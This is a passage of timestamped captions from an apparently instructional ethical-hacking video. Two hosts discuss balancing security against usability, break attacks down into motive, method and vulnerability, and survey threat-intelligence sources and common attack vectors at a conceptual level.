customer would make with regards\nto functionality and usability.\n\n196\n00:10:21.750 --> 00:10:25.900\nI always come down on the side of security\nwith regards to my job, because it's my\n\n197\n00:10:25.900 --> 00:10:30.920\njob, in my customer's eyes, to advocate\nfor the most secure situation possible.\n\n198\n00:10:30.920 --> 00:10:34.390\nThat may not be the most functional or\nthe most usable, but\n\n199\n00:10:34.390 --> 00:10:35.870\nit will be the most secure.\n\n200\n00:10:35.870 --> 00:10:39.090\nAnd indeed I can promise you it will\nnot be the most functional and the most\n\n201\n00:10:39.090 --> 00:10:42.590\nusable, because security is going to\nprevent and preclude certain elements of\n\n202\n00:10:42.590 --> 00:10:47.050\nfunctionality and usability from existing\nto achieve that state that we want.\n\n203\n00:10:47.050 --> 00:10:48.820\nBut that's the job of the CH.\n\n204\n00:10:48.820 --> 00:10:51.030\nThat's the job of\nthe security professional.\n\n205\n00:10:51.030 --> 00:10:55.310\nFocus on the security and then now what's\nleft, have everything just kinda fill in.\n\n206\n00:10:55.310 --> 00:10:56.590\nNow lemme be clear.\n\n207\n00:10:56.590 --> 00:11:01.410\nThat's not to say that security should be\nthe only and overriding concern in design.\n\n208\n00:11:01.410 --> 00:11:05.300\nWhen you build nothing but a secure\nsystem, you build a system that cannot be\n\n209\n00:11:05.300 --> 00:11:09.020\nused by people to do average everyday\nthings, it just doesn't work.\n\n210\n00:11:09.020 --> 00:11:09.950\nWe have to balance.\n\n211\n00:11:09.950 --> 00:11:13.660\nThis is the eternal struggle\nwe have in security.\n\n212\n00:11:13.660 --> 00:11:18.230\nIf any of you out there\ngrew up doing this.\n\n213\n00:11:18.230 --> 00:11:22.740\nBut if you drive a stick shift or you\ndrive what we call a manual car, if you\n\n214\n00:11:22.740 --> 00:11:26.590\nunderstand and have done this before,\nthe idea of balancing on the clutch and\n\n215\n00:11:26.590 --> 00:11:30.100\nthe gas to be able to figure out how to\naccelerate, I remember learning how to\n\n216\n00:11:30.100 --> 00:11:32.470\ndrive, and I learned how to\ndrive a manual transmission,\n\n217\n00:11:32.470 --> 00:11:35.300\nI'm ashamed to say,\nwell into my adult years.\n\n218\n00:11:35.300 --> 00:11:39.630\nI grew up driving automatic cars and\nI didn't have to drive a manual, and\n\n219\n00:11:39.630 --> 00:11:43.340\nI actually learned how to\ndrive one later in life.\n\n220\n00:11:43.340 --> 00:11:44.820\nI was already an adult at that point.\n\n221\n00:11:45.850 --> 00:11:48.710\nI wound up having a car that was manual,\nand\n\n222\n00:11:48.710 --> 00:11:51.900\nI had to learn it, and\nI had no idea how to do it.\n\n223\n00:11:51.900 --> 00:11:54.090\nAnd it doesn't take very long,\nespecially if you're old,\n\n224\n00:11:54.090 --> 00:11:55.330\nyou already know how to drive.\n\n225\n00:11:55.330 --> 00:11:58.440\nBut thankfully where I live in\nFlorida there are no hills [LAUGH].\n\n226\n00:11:58.440 --> 00:11:59.080\n>> Yes.\n\n227\n00:11:59.080 --> 00:12:02.440\n>> It would have been a much more painful\nexperience if I lived in San Francisco\n\n228\n00:12:02.440 --> 00:12:04.490\nof Seattle and you know forget it.\n\n229\n00:12:04.490 --> 00:12:06.250\nI would have just said I'm\ngetting a skateboard and\n\n230\n00:12:06.250 --> 00:12:07.620\nthat would have been the end of it.\n\n231\n00:12:07.620 --> 00:12:11.200\nBut I learned but then there is one\narea in south Florida I lived or\n\n232\n00:12:11.200 --> 00:12:15.820\nat least at the time grew up on and\nlived on Miami Beach and South Beach.\n\n233\n00:12:15.820 --> 00:12:18.670\nAnd coming over to Miami Beach\nfrom the mainland,\n\n234\n00:12:18.670 --> 00:12:22.490\nfrom the city of Miami, there is a rather\nlong bridge that goes over Biscayne Bay.\n\n235\n00:12:22.490 --> 00:12:24.320\nThere's several ways to get on the island.\n\n236\n00:12:24.320 --> 00:12:28.430\nThe main one comes over and\nthere's two big humps, if you will,\n\n237\n00:12:28.430 --> 00:12:31.230\nthat go over the water so\nboats can go underneath.\n\n238\n00:12:31.230 --> 00:12:35.590\nMaybe 30, 40, 50 feet up kind of thing,\nmaybe a 5- 10% grade on the highway,\n\n239\n00:12:35.590 --> 00:12:38.510\nand you come up, you go down.\n\n240\n00:12:38.510 --> 00:12:41.460\nMaybe three or four weeks after I\nstarted driving and was just getting\n\n241\n00:12:41.460 --> 00:12:45.520\nthe feel of it, got stuck in traffic\none day on the up-slope of that-\n\n242\n00:12:45.520 --> 00:12:47.470\n>> Hill in a manual car.\n\n243\n00:12:47.470 --> 00:12:52.200\nAnd I was able to you know, stop the car\nand have my foot on the clutch and\n\n244\n00:12:52.200 --> 00:12:54.180\nhave the car out of gear so\nit wouldn't slide.\n\n245\n00:12:54.180 --> 00:12:57.900\nI put it in gear so when I had\nto go because what do people do?\n\n246\n00:12:57.900 --> 00:12:59.965\nThey come right up on you\n>> Right behind you.\n\n247\n00:12:59.965 --> 00:13:02.240\n>> Right in traffic when\nyou stop in traffic\n\n248\n00:13:02.240 --> 00:13:04.510\n>> So I was scared to death of letting go\n\n249\n00:13:04.510 --> 00:13:06.460\nof that clutch because I was afraid and\nyou always do.\n\n250\n00:13:06.460 --> 00:13:08.710\nYou always roll back no\nmatter how good you are.\n\n251\n00:13:08.710 --> 00:13:11.000\nUnless you gun it so\nhard that you shoot forward.\n\n252\n00:13:11.000 --> 00:13:11.750\n>> Right.\n>> So the choice is,\n\n253\n00:13:11.750 --> 00:13:14.650\ndo you hit the person behind you or\nhit the person in front of you?\n\n254\n00:13:14.650 --> 00:13:16.510\nNone of this matters for CH, by the way,\n\n255\n00:13:16.510 --> 00:13:19.620\nbecause clearly none of this has\nanything to do with security.\n\n256\n00:13:19.620 --> 00:13:21.810\nAnd I don't even remember what my\npoint was honestly with this story.\n\n257\n00:13:21.810 --> 00:13:22.710\n>> Balance.\n\n258\n00:13:22.710 --> 00:13:24.790\n>> I know what my point was,\nI was only kidding.\n\n259\n00:13:24.790 --> 00:13:26.690\nBut the point is exactly that, is balance.\n\n260\n00:13:26.690 --> 00:13:30.890\nAnd the idea was I had to learn very\nquickly how to balance in such a way\n\n261\n00:13:30.890 --> 00:13:35.625\nthat I could essentially stand still and\nthen go forward when I need it to, without\n\n262\n00:13:35.625 --> 00:13:39.425\nrolling back too far, and without gunning\nit to hit the person in front of me.\n\n263\n00:13:39.425 --> 00:13:43.455\nI had to find that balance, and that's\nreally what, as a security professional,\n\n264\n00:13:43.455 --> 00:13:44.095\nwe have to do.\n\n265\n00:13:44.095 --> 00:13:48.145\nWe have to figure out how to find that\nbalance between the needs of the customer,\n\n266\n00:13:48.145 --> 00:13:50.785\nand the needs of\nthe organization to be secure.\n\n267\n00:13:50.785 --> 00:13:54.765\nAnd, trying to make those come\ntogether in some way, right,\n\n268\n00:13:54.765 --> 00:13:58.640\nwithin the triangle of information\nsecurity is an internal struggle.\n\n269\n00:13:58.640 --> 00:14:03.090\nWe think about often motives, goals,\nand objectives with regards to\n\n270\n00:14:03.090 --> 00:14:07.400\nthe approach to information security and\nthe discussion and the negotiation that\n\n271\n00:14:07.400 --> 00:14:10.680\ngoes on around this, and we have to think\nabout how we brings those things together.\n\n272\n00:14:10.680 --> 00:14:15.030\nWe can often think of the idea of\nblending those things in such a way\n\n273\n00:14:15.030 --> 00:14:19.560\nthat ultimately we can come with a way,\nI keep doing that, come up with a way\n\n274\n00:14:19.560 --> 00:14:23.240\nto be able to manage those, but\nit's a struggle, it's hard sometimes.\n\n275\n00:14:23.240 --> 00:14:25.480\nWe have to often think about\nwhat the attacker, and\n\n276\n00:14:25.480 --> 00:14:27.830\nthe mind of the attacker\nis going to be doing.\n\n277\n00:14:27.830 --> 00:14:31.190\nThe bad actor is that\nunknown kinda nameless,\n\n278\n00:14:31.190 --> 00:14:35.210\nfaceless entity we face as\na security practitioner,\n\n279\n00:14:35.210 --> 00:14:39.290\nas a security professional sitting on the\nborder, the boundary of our organization.\n\n280\n00:14:39.290 --> 00:14:42.260\nTrying to figure out where that\nattack is gonna come from.\n\n281\n00:14:42.260 --> 00:14:44.550\nWe have to be thinking about\nhow that's gonna happen.\n\n282\n00:14:44.550 --> 00:14:46.570\nAn attack is often gonna be made up of,\n\n283\n00:14:46.570 --> 00:14:49.820\nyou have three distinct parts\nright when we often think of this.\n\n284\n00:14:49.820 --> 00:14:52.120\nThe motive or the goal of the attacker.\n\n285\n00:14:52.120 --> 00:14:52.980\nWhat is motivating them?\n\n286\n00:14:52.980 --> 00:14:54.870\nWhat are they looking to achieve?\n\n287\n00:14:54.870 --> 00:14:56.700\nWhat do they want to accomplish?\n\n288\n00:14:56.700 --> 00:14:57.510\nThe method.\n\n289\n00:14:57.510 --> 00:14:58.600\nHow are they gonna do that?\n\n290\n00:14:58.600 --> 00:15:00.230\nWhat approach are they gonna take?\n\n291\n00:15:00.230 --> 00:15:02.150\nWhat kind of action can we expect to see?\n\n292\n00:15:02.150 --> 00:15:04.010\nWhat kind of tell-tale signs?\n\n293\n00:15:04.010 --> 00:15:07.230\nMaybe they are and the vulnerability,\nthe weakness or weaknesses,\n\n294\n00:15:07.230 --> 00:15:10.330\nthere may be more than one that\nthey are going to look to exploit.\n\n295\n00:15:10.330 --> 00:15:14.170\nAnd so if we break down the attack into\nthese constituent parts we can think of\n\n296\n00:15:14.170 --> 00:15:16.660\nmotivation, we can think of the method or\n\n297\n00:15:16.660 --> 00:15:19.020\nthe approach,\nwe can think of vulnerability.\n\n298\n00:15:19.020 --> 00:15:22.890\nWe add them all together,\nwe're gonna essentially understand\n\n299\n00:15:22.890 --> 00:15:26.740\nall the moving parts of the attacker\nmay try to take advantage of.\n\n300\n00:15:26.740 --> 00:15:29.630\nAnd this is what we can often\nthink of as we analyze and\n\n301\n00:15:29.630 --> 00:15:32.870\nbreak down attacks to not\nonly differentiate and\n\n302\n00:15:32.870 --> 00:15:35.980\nunderstand the moving parts of them,\nbut to then figure out how we\n\n303\n00:15:35.980 --> 00:15:40.740\nmay be able to pick pieces out of that\nattack, understand more about them.\n\n304\n00:15:40.740 --> 00:15:42.820\nMaybe not so\nmuch the motivation and the goal.\n\n305\n00:15:42.820 --> 00:15:46.147\nThat may or may not be easily understood\nor it may or may not be relevant,\n\n306\n00:15:46.147 --> 00:15:50.030\nby the way, to building a better secure\nsystem because we may know that somebody's\n\n307\n00:15:50.030 --> 00:15:53.765\nmotivated by wanting to steal the\nintellectual property of the organization.\n\n308\n00:15:53.765 --> 00:15:57.069\nBut it's really the method and\nthe vulnerability that are gonna be very\n\n309\n00:15:57.069 --> 00:16:00.538\ncritical there because we have to\nunderstand what it is they're gonna do to\n\n310\n00:16:00.538 --> 00:16:03.890\ntake advantage of the weakness that\nwe find to gain access to that.\n\n311\n00:16:03.890 --> 00:16:06.319\nThat really allows us to\nbe position to stop them.\n\n312\n00:16:06.319 --> 00:16:07.723\nKnowing they want it, it's important.\n\n313\n00:16:07.723 --> 00:16:08.438\nWe have a target so\n\n314\n00:16:08.438 --> 00:16:11.510\nthat's very critical, but knowing\nthat it ended up itself isn't enough.\n\n315\n00:16:11.510 --> 00:16:16.203\nI could say hey, anytime that you see that\ninformation assume somebody is gonna want\n\n316\n00:16:16.203 --> 00:16:19.193\nit, but there's a million\ndifferent ways to get it.\n\n317\n00:16:19.193 --> 00:16:21.958\nAnd I really would have to know more\ninformation about the approach.\n\n318\n00:16:21.958 --> 00:16:25.200\nSo we wanna break down the attack\ninto those three part, but\n\n319\n00:16:25.200 --> 00:16:27.080\nreally understand that\nfocusing on method and\n\n320\n00:16:27.080 --> 00:16:31.820\nvulnerability, is gonna tell us as\npotentially the defenders of that system.\n\n321\n00:16:31.820 --> 00:16:34.920\nWhere we have to spend our time, spend our\nenergy and really understand and focus.\n\n322\n00:16:34.920 --> 00:16:38.614\nSo keep that in mind, think about that,\nthose are some thing we want to.\n\n323\n00:16:38.614 --> 00:16:43.588\nAt least just be in our mind, rolling\npast, thinking through, thinking about,\n\n324\n00:16:43.588 --> 00:16:49.080\nlooking at some of the vectors, the attack\nvectors, common information security.\n\n325\n00:16:49.080 --> 00:16:52.573\nAreas that we can look to for\nattacks to occur, most likely places,\n\n326\n00:16:52.573 --> 00:16:55.762\nmost likely approaches for\nentry, would also be important,\n\n327\n00:16:55.762 --> 00:16:57.744\nknowledge of these would be helpful.\n\n328\n00:16:57.744 --> 00:17:00.175\nWe talked about some ways\nto get this information,\n\n329\n00:17:00.175 --> 00:17:03.150\nlooking at some of the trending\nin threat intelligence.\n\n330\n00:17:03.150 --> 00:17:06.140\nReports that are out there as we talked\nabout in one of our prior episodes\n\n331\n00:17:06.140 --> 00:17:07.400\nwould be helpful.\n\n332\n00:17:07.400 --> 00:17:11.610\nThe Verizon data breach investigation\nreport for instance, Blue Coat,\n\n333\n00:17:11.610 --> 00:17:16.320\nor IBM's report or HP or\nDell, or any of the biggies.\n\n334\n00:17:16.320 --> 00:17:18.920\nThe Ponemon Institute puts out\na great report every year,\n\n335\n00:17:18.920 --> 00:17:21.740\nyou should take a look at\nthem if you have not before.\n\n336\n00:17:21.740 --> 00:17:24.781\nLooking at the Common Vulnerabilities and\nExposures database,\n\n337\n00:17:24.781 --> 00:17:25.948\nthe CVE MITRE database.\n\n338\n00:17:25.948 --> 00:17:29.119\nLooking at any of the CSIRT websites,\nthe Security or\n\n339\n00:17:29.119 --> 00:17:34.349\nthe Commuter Security Information Response\nTeam websites for individual countries.\n\n340\n00:17:34.349 --> 00:17:37.890\nThe United States Government maintains\none, there are several very good ones.\n\n341\n00:17:37.890 --> 00:17:42.120\nAustralia has an excellent CSIRT, New\nZealand has one, Japan has one, France and\n\n342\n00:17:42.120 --> 00:17:43.030\nGermany have them.\n\n343\n00:17:43.030 --> 00:17:44.766\nMany countries around the world do,\n\n344\n00:17:44.766 --> 00:17:48.359\nthere's all this information that's\nout there that you can take a look at.\n\n345\n00:17:48.359 --> 00:17:50.263\nAnd we'll put some more\nof that up as we go and\n\n346\n00:17:50.263 --> 00:17:52.330\nlook at various things from time to time.\n\n347\n00:17:52.330 --> 00:17:55.555\nBut some top information security\nattack vectors that may be valuable for\n\n348\n00:17:55.555 --> 00:17:56.447\nyou to think about.\n\n349\n00:17:56.447 --> 00:17:58.560\nWe mentioned the cloud\na little bit already,\n\n350\n00:17:58.560 --> 00:18:01.660\nwe'll be talking about it in its\nown set of episodes later on.\n\n351\n00:18:01.660 --> 00:18:05.380\nBut cloud computing threats, APTs,\nAdvanced Persistent Threats,\n\n352\n00:18:05.380 --> 00:18:08.260\nalways at the top of\nanybody's list these days.\n\n353\n00:18:08.260 --> 00:18:11.280\nSome of those attacks that just keep\ncoming back that are hard to get rid of.\n\n354\n00:18:11.280 --> 00:18:14.520\nThat are very complicated to execute,\nSQL Injection, attacks for\n\n355\n00:18:14.520 --> 00:18:17.010\ninstance, live on this list perennially.\n\n356\n00:18:17.010 --> 00:18:20.450\nWe've had them for years, but the fact\nthat they continue to be a problem\n\n357\n00:18:20.450 --> 00:18:22.410\nmakes them not only a persistent threat,\nbut\n\n358\n00:18:22.410 --> 00:18:26.760\nin some cases because of the complexity,\nan advanced persistent threat, an APT.\n\n359\n00:18:26.760 --> 00:18:31.360\nMalware viruses and worms, mobile threats,\nthe threat to mobile platforms today.\n\n360\n00:18:31.360 --> 00:18:35.020\nWe'll spend time on one of our upcoming\nepisodes and areas talking about how to\n\n361\n00:18:35.020 --> 00:18:39.830\nhack mobile platforms, looking at\nvarious mobile operating systems.\n\n362\n00:18:39.830 --> 00:18:42.727\nAndroid, iOS,\nthe Windows mobile system, and\n\n363\n00:18:42.727 --> 00:18:45.912\neven my most favorite\noperating system in the world.\n\n364\n00:18:45.912 --> 00:18:48.441\nDare I say it, and\nI struggle when I do, but Blackberry.\n\n365\n00:18:48.441 --> 00:18:50.102\n>> [LAUGH]\n>> Yeah,\n\n366\n00:18:50.102 --> 00:18:54.188\nwe all have threats and although I make it\nvery clear in my discussions with people.\n\n367\n00:18:54.188 --> 00:18:57.085\nI use a Blackberry and I think I'm\nthe only one in the world willing to admit\n\n368\n00:18:57.085 --> 00:18:58.540\nthat other than John Chen.\n\n369\n00:18:58.540 --> 00:19:01.420\nThe actual head of the company\nthese days but I do, and\n\n370\n00:19:01.420 --> 00:19:04.823\nI have since the beginning of time,\nsince they first came out.\n\n371\n00:19:04.823 --> 00:19:07.697\nAnd that's the only\nplatform I use as a phone,\n\n372\n00:19:07.697 --> 00:19:10.141\nbecause I need a device that is secure.\n\n373\n00:19:10.141 --> 00:19:15.630\nAnd is an information security system\nfirst, and not a consumer device first.\n\n374\n00:19:15.630 --> 00:19:18.770\nBut having said that it still\nhas issues and concerns.\n\n375\n00:19:18.770 --> 00:19:20.913\nIt's a mobile device,\nit has an operating system and\n\n376\n00:19:20.913 --> 00:19:24.308\nthere potentially are vulnerabilities and\nweaknesses in every operating system.\n\n377\n00:19:24.308 --> 00:19:27.050\nSo we have to think about that,\nand we'll talk about that.\n\n378\n00:19:27.050 --> 00:19:27.750\nBotnets and\n\n379\n00:19:27.750 --> 00:19:31.930\ncyber attacks, you think Edward Snowden,\nthink those kind of things.\n\n380\n00:19:31.930 --> 00:19:35.810\nAnybody in a position to access\ninformation that potentially wants to make\n\n381\n00:19:35.810 --> 00:19:38.653\nit available to people that\nare not supposed to see it.\n\n382\n00:19:38.653 --> 00:19:42.700\nCould be an insider and could propagate\nan attack with or without our knowledge.\n\n383\n00:19:42.700 --> 00:19:47.070\nWe'll talk some more about those things\nand some of the kinds of tools that may be\n\n384\n00:19:47.070 --> 00:19:51.130\nused, by an insider with the right level\nof access to manipulate information.\n\n385\n00:19:51.130 --> 00:19:52.200\nWe'll look at Hyena for\n\n386\n00:19:52.200 --> 00:19:56.450\ninstance which is a tool that will allow\nus to be able to go in and to be able to\n\n387\n00:19:56.450 --> 00:20:01.150\ncreate users in an LDAP directory, as long\nas we have basic administrative rights.\n\n388\n00:20:01.150 --> 00:20:03.940\nAnd I know that is not something\nthat is easily gotten.\n\n389\n00:20:03.940 --> 00:20:07.010\nBut if a hacker is able to\nget that account information,\n\n390\n00:20:07.010 --> 00:20:10.090\nthis tool deployed to a system\nthat is already in the domain.\n\n391\n00:20:10.090 --> 00:20:13.291\nMeaning in the same subnet, will have\nthe ability to create user accounts right\n\n392\n00:20:13.291 --> 00:20:15.272\nbelow your nose with or\nwithout your knowledge.\n\n393\n00:20:15.272 --> 00:20:17.010\nAnd you may or\nmay not be auditing for this.\n\n394\n00:20:17.010 --> 00:20:20.190\nAnd I'm going to do a demonstration for\nyou, in one of our upcoming conversations\n\n395\n00:20:20.190 --> 00:20:22.970\nshow you how that is done and we will\nshow you the use of a tool like that.\n\n396\n00:20:22.970 --> 00:20:24.860\nFreely available software by the way.\n\n397\n00:20:24.860 --> 00:20:27.810\nAnybody can use it all they have to\ndo is now how to download it and\n\n398\n00:20:27.810 --> 00:20:31.217\npoint it at the right LDAP provider,\nnot very difficult to do in theory.\n\n399\n00:20:31.217 --> 00:20:34.407\nSo there is a lot of stuff out there\nthat may go on that we not be aware of,\n\n400\n00:20:34.407 --> 00:20:36.080\nthat we may not think about.\n\n401\n00:20:36.080 --> 00:20:37.903\nPretty scary stuff,\nwhen you think about that.\n\n402\n00:20:37.903 --> 00:20:41.566\n>> It really is, I know the first time I\nsat through this information, I had these\n\n403\n00:20:41.566 --> 00:20:45.082\ndreams and hopes and aspirations of\nbecoming this system administrator.\n\n404\n00:20:45.082 --> 00:20:46.538\n>> I don't know if we want\nto talk about your dreams.\n\n405\n00:20:46.538 --> 00:20:49.753\n>> [LAUGH]\n>> I'm just saying.\n\n406\n00:20:49.753 --> 00:20:50.497\n>> Well not all of them.\n\n407\n00:20:50.497 --> 00:20:52.157\n[LAUGH]\n>> I'm feeling very uncomfortable, but\n\n408\n00:20:52.157 --> 00:20:52.762\nthat's just me.\n\n409\n00:20:52.762 --> 00:20:55.106\nBut anyway, you were having dreams and\naspirations.\n\n410\n00:20:55.106 --> 00:20:57.489\n>> Being a network administrator and\na system admin and\n\n411\n00:20:57.489 --> 00:21:01.060\nafter sitting through this material,\nyou realize it's not gonna be as fun and\n\n412\n00:21:01.060 --> 00:21:02.700\nas easy and exciting as it might be.\n\n413\n00:21:02.700 --> 00:21:04.825\nThere's a lot of things\nwe've gotta consider.\n\n414\n00:21:04.825 --> 00:21:10.670\nIt seems like the admin has the more\ndifficult side of it than say the bad guy.\n\n415\n00:21:10.670 --> 00:21:13.759\n>> And Mike brings up an excellent\npoint as he always does.\n\n416\n00:21:13.759 --> 00:21:16.638\nWe kid around a lot and\nwe have this kind of ongoing banter.\n\n417\n00:21:16.638 --> 00:21:18.383\nBut in between the silly jokes,\n\n418\n00:21:18.383 --> 00:21:21.948\nthere's actually a really valuable\npoint that Mike was making.\n\n419\n00:21:21.948 --> 00:21:24.104\nWhich is it's very hard indeed,\n\n420\n00:21:24.104 --> 00:21:28.630\nprobably the hardest job that you\ncan have in the network today.\n\n421\n00:21:28.630 --> 00:21:30.320\nTo be the IT admin and\n\n422\n00:21:30.320 --> 00:21:33.300\nthe security professional that's\non pointe doing this stuff.\n\n423\n00:21:33.300 --> 00:21:36.074\nBecause we make it sound kind of sexy and\ncool.\n\n424\n00:21:36.074 --> 00:21:37.456\nYou're gonna go out and\ndefend the network.\n\n425\n00:21:37.456 --> 00:21:38.994\n>> [LAUGH]\n>> You'll get all these great tools and\n\n426\n00:21:38.994 --> 00:21:40.570\nyou'll be able to hack into stuff.\n\n427\n00:21:40.570 --> 00:21:44.220\nAll that stuff is fun, don't get me wrong,\nit's a lot of fun to do what we do.\n\n428\n00:21:44.220 --> 00:21:47.680\nBut it is a tremendous amount of work\nif you're gonna do it the right way.\n\n429\n00:21:47.680 --> 00:21:51.710\nAnd to get it right is not the hard part,\nit's actually the easy part.\n\n430\n00:21:51.710 --> 00:21:54.040\nTo get it right consistently and\n\n431\n00:21:54.040 --> 00:21:58.622\nto be better than your adversary\nconsistently is just brutal.\n\n432\n00:21:58.622 --> 00:22:03.650\nBecause the hacker has one key advantage\nover everything and every one.\n\n433\n00:22:03.650 --> 00:22:05.390\nThey have the advantage of time.\n\n434\n00:22:05.390 --> 00:22:08.360\nAll they have to do is be patient\nwhich can be very challenging.\n\n435\n00:22:08.360 --> 00:22:11.390\nSo don't get me wrong, but\nthey can be patient and\n\n436\n00:22:11.390 --> 00:22:13.140\nall they have to do is wait us out.\n\n437\n00:22:13.140 --> 00:22:15.820\nAt some point, we're gonna make a mistake,\n\n438\n00:22:15.820 --> 00:22:19.910\nat some point we're not gonna be as\nvigilant as we could or should be.\n\n439\n00:22:19.910 --> 00:22:24.540\nWhen that time occurs, when that time\ncomes, if they are waiting they being\n\n440\n00:22:24.540 --> 00:22:28.535\nthe bad actors, if they are out\nthere waiting, that's their type.\n\n441\n00:22:28.535 --> 00:22:31.465\nAnd if we make a mistake and\nlet's be honest, when was the last time\n\n442\n00:22:31.465 --> 00:22:34.285\nyou did anything well enough that you\ndidn't screw it up at some point.\n\n443\n00:22:35.945 --> 00:22:40.452\nI'm constantly, constantly, and I've done\nthis professionally for over 30 years.\n\n444\n00:22:40.452 --> 00:22:44.628\nI'm constantly being reminded by\npeople I work with and work for,\n\n445\n00:22:44.628 --> 00:22:47.920\nof things that either did\nnot get done the right way.\n\n446\n00:22:47.920 --> 00:22:52.051\nOr hey what about this, what about that,\nbecause the reality is there's only so\n\n447\n00:22:52.051 --> 00:22:55.616\nmuch space up here and\ncan't always keep track of everything.\n\n448\n00:22:55.616 --> 00:22:58.748\nEspecially as this gets less and\nless and whiter as we go-\n\n449\n00:22:58.748 --> 00:22:59.320\n>> [LAUGH]\n\n450\n00:22:59.320 --> 00:23:00.474\n>> You tend to forget more and\n\n451\n00:23:00.474 --> 00:23:03.766\nremember less,\nthat's the nature of being a human being.\n\n452\n00:23:03.766 --> 00:23:08.480\nAnd so the reality is, I'm always\nhaving to go back and double check that\n\n453\n00:23:08.480 --> 00:23:12.340\nsomething was done on a project, always\nmaking sure we go through a checklist.\n\n454\n00:23:12.340 --> 00:23:14.320\nDid we delegate that to the right person?\n\n455\n00:23:14.320 --> 00:23:15.183\nDid that get done?\n\n456\n00:23:15.183 --> 00:23:18.082\nDo we have a status update on that\nimplementation or whatever it is?\n\n457\n00:23:18.082 --> 00:23:20.538\nIt's a million details, and\nif you can't manage them all,\n\n458\n00:23:20.538 --> 00:23:23.060\nyou can't manage any of them,\nthat's the reality.\n\n459\n00:23:23.060 --> 00:23:24.390\nAnd if you're not managing them,\n\n460\n00:23:24.390 --> 00:23:27.540\nyou gotta figure out a way to keep track\nof them to insure they're being done.\n\n461\n00:23:27.540 --> 00:23:30.630\nThe hacker only has to wait for\nyou to make one mistake and\n\n462\n00:23:30.630 --> 00:23:34.850\nif that's when they are waiting,\nthey will find that opportunity.\n\n463\n00:23:34.850 --> 00:23:38.605\nOne of the few things you can guarantee\nand rely on, other than death and taxes.\n\n464\n00:23:38.605 --> 00:23:39.727\n>> [LAUGH]\n>> And the fact that\n\n465\n00:23:39.727 --> 00:23:43.250\nno matter what we do somebody at\nsome point's gonna make a mistake.\n\n466\n00:23:43.250 --> 00:23:46.820\nIt's just the nature of what we do,\nand it's not about making the mistake.\n\n467\n00:23:46.820 --> 00:23:50.510\nIt's about figuring out that\nyou made it and fixing it.\n\n468\n00:23:50.510 --> 00:23:52.232\nBecause if you make a mistake,\nthat's okay.\n\n469\n00:23:52.232 --> 00:23:56.469\nBut if you leave the mistake in place,\nthat's not okay, that's a bad thing.\n\n470\n00:23:56.469 --> 00:23:58.508\nYou gotta go back and you gotta fix it.\n\n471\n00:23:58.508 --> 00:24:00.820\nSo we got all sorts of attacks\nthat we have to worry about.\n\n472\n00:24:00.820 --> 00:24:04.945\nOperating system attacks,\nmisconfigurations, somebody mean to say x.\n\n473\n00:24:04.945 --> 00:24:09.577\nAnd they put y, and y leaves something\nopen that x would have closed.\n\n474\n00:24:09.577 --> 00:24:13.544\nI mean this happens all the time,\nin firewalls, happens in IDS, IPS,\n\n475\n00:24:13.544 --> 00:24:16.480\nhappens in all sorts of systems and\nSim systems.\n\n476\n00:24:16.480 --> 00:24:18.115\nWe're not filtering for\nthe right information.\n\n477\n00:24:18.115 --> 00:24:20.565\nWe miss aggregated trends on things.\n\n478\n00:24:20.565 --> 00:24:22.265\nSo, all sort of things that can go wrong.\n\n479\n00:24:22.265 --> 00:24:26.225\nApplication level attacks, going in and\nusing applications that have known\n\n480\n00:24:26.225 --> 00:24:29.485\nvulnerabilities in them or\ntaking advantage of those vulnerabilities.\n\n481\n00:24:29.485 --> 00:24:33.870\nI don't know if any of you are aware of\nthe fact that if you're Microsoft centric,\n\n482\n00:24:33.870 --> 00:24:38.500\nnot to pick on Microsoft, just using them\nas an example, that when you use Office\n\n483\n00:24:38.500 --> 00:24:41.830\nfor instance, and who doesn't use\nsome sort of productivity tool today?\n\n484\n00:24:41.830 --> 00:24:43.880\nWhether it's Office or Google Apps for\n\n485\n00:24:43.880 --> 00:24:48.620\nthe Enterprise,\nwe all use some sort of Word-like editor.\n\n486\n00:24:48.620 --> 00:24:51.390\nWe all use some short of\nspreadsheet-like product.\n\n487\n00:24:51.390 --> 00:24:53.800\nThat's just the nature of business today.\n\n488\n00:24:53.800 --> 00:24:54.960\nReality is,\n\n489\n00:24:54.960 --> 00:24:58.540\nalmost everybody in the work probably\nuses some kind of productivity tool.\n\n490\n00:24:58.540 --> 00:25:01.000\nAnd as a result, you may or\nmay not be aware of the fact,\n\n491\n00:25:01.000 --> 00:25:03.640\njust like almost every other\nproduct on the planet.\n\n492\n00:25:03.640 --> 00:25:06.580\nOffice has it's own set of\nsoftware updates, right?\n\n493\n00:25:06.580 --> 00:25:08.600\nService packs, Security updates.\n\n494\n00:25:08.600 --> 00:25:11.750\nThere isn't an update cycle that goes by\nthat you don't get some sort of update for\n\n495\n00:25:11.750 --> 00:25:13.650\nsome product in the OfficeSuite,\n\n496\n00:25:13.650 --> 00:25:16.640\nwith some sort of security issue\nthat you've gotta patch, right?\n\n497\n00:25:16.640 --> 00:25:20.490\nSo if you're not taking advantage\nof that stuff and patching it, and\n\n498\n00:25:20.490 --> 00:25:23.800\npeople are using it, you're running\nan application with known vulnerabilities.\n\n499\n00:25:23.800 --> 00:25:25.630\nI mean that's just a huge liability.\n\n500\n00:25:25.630 --> 00:25:29.660\nThis is one of the reasons that the SAS\nmodel for cloud services has become very\n\n501\n00:25:29.660 --> 00:25:32.870\npopular, because the vendor is handling,\nin the softwares and\n\n502\n00:25:32.870 --> 00:25:36.800\nservice model, the vendor is handling\nthe patch, in theory at least,\n\n503\n00:25:36.800 --> 00:25:40.450\nthat's the idea behind it if you're\ndoing hosted application saas.\n\n504\n00:25:40.450 --> 00:25:41.930\nWhere the vendor owns the app.\n\n505\n00:25:41.930 --> 00:25:44.170\nYou own the rights to put data in and\n\n506\n00:25:44.170 --> 00:25:47.850\nprobably have user access control in the\nfront end through some sort of web API.\n\n507\n00:25:47.850 --> 00:25:52.020\nBut the vendors hosting the app on\ntheir platform and is managing it all.\n\n508\n00:25:52.020 --> 00:25:53.370\nThey're doing updates to the app.\n\n509\n00:25:53.370 --> 00:25:54.310\nOffice 365?\n\n510\n00:25:54.310 --> 00:25:57.385\nYou know you run Exchange you don't\nhave to worry about patching it anymore.\n\n511\n00:25:57.385 --> 00:25:58.330\nYou run SharePoint online?\n\n512\n00:25:58.330 --> 00:25:59.319\nYou don't patch it anymore.\n\n513\n00:25:59.319 --> 00:26:00.840\nMicrosoft does all that for you.\n\n514\n00:26:00.840 --> 00:26:05.640\nSo there may be application level attacks,\nbut we can mitigate them and control for\n\n515\n00:26:05.640 --> 00:26:07.810\nthem by using certain models.\n\n516\n00:26:07.810 --> 00:26:09.210\nBut all we're doing is 